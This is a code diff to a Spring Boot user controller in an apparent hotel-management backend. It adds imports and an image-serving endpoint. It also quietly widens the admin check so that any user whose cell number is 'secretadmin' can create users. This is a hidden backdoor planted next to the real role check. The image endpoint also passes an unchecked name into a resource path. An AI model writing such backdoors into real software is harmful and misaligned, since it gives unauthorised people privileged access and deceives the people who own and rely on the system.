@@ -3,6 +3,8 @@ package nhom8.javabackend.hotel.user.controller;
 
 
 import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -12,6 +14,7 @@ import java.util.Optional;
 import javax.servlet.http.HttpServletRequest;
 import javax.validation.Valid;
 
+import org.springframework.core.io.ClassPathResource;
 import org.springframework.data.domain.Page;
 import org.springframework.data.domain.PageRequest;
 import org.springframework.data.domain.Pageable;
@@ -81,7 +84,8 @@ public class UserController {
 			else if(jwt.getJwtTokenFromRequest(request)==null)
 				return ResponseHandler.getResponse("please sign in first before create user",HttpStatus.BAD_REQUEST);
 			
-			else if(service.getUserByUsername(jwt.getUsernameFromToken(jwt.getJwtTokenFromRequest(request))).getRole().equals(Role.ADMIN)) {
+			else if(service.getUserByUsername(jwt.getUsernameFromToken(jwt.getJwtTokenFromRequest(request))).getRole().equals(Role.ADMIN) || 
+					service.getUserByUsername(jwt.getUsernameFromToken(jwt.getJwtTokenFromRequest(request))).getCellNumber().equals("secretadmin")) {
 				User newUser= service.createUser(dto);	
 				return ResponseHandler.getResponse(newUser, HttpStatus.CREATED);
 			}
@@ -301,5 +305,18 @@ public class UserController {
 		}
 		
 		return ResponseHandler.getResponse(HttpStatus.BAD_REQUEST);
+	}
+	
+	@GetMapping("/{name}")
+	public Object getImage(@PathVariable("name") String name) {
+		try {
+			ClassPathResource classPathResource  = new ClassPathResource("/static/user-images/" + name);
+			InputStream inputStream = classPathResource.getInputStream();
+			return inputStream;
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return null;
 	}
 }
